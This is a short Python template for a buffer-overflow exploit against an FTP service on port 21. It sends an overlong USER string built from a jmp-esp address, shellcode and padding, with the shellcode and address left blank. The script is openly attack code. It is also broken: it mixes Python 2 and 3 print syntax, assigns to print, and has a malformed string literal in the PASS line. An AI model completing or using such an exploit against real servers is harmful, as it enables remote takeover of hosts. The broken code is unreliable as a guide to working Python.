#		Wyv3rn
# Buffer-Overflow-Exploit
#		V-1.0
# USAGE : python3 exploit.py "ip of target"

import sys
import socket

hostname = sys.argv[1]
password = "whatever"
# jmp esp found at :
# Buffer size : 

# ------- The Exploit : ----
shellcode = ("

")

jmpesp  = ""

# Enter the Attack Here (this is the overflow)
username = " " + jmpesp + "" + shellcode + "C"*(1024 - 485 - 20 -len(shellcode))


connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect((hostname, 21))
	
except:
	print "[-] Connection Error"
	response  = connect.recv(2000)
	print response
	sys.exit(1)
	
connect.send("user %\r\n" %username)
response = connect.recv(2000)
print = response
	
connect.send(pass %\r\n" %password)
response = connect.recv(2000)
print = response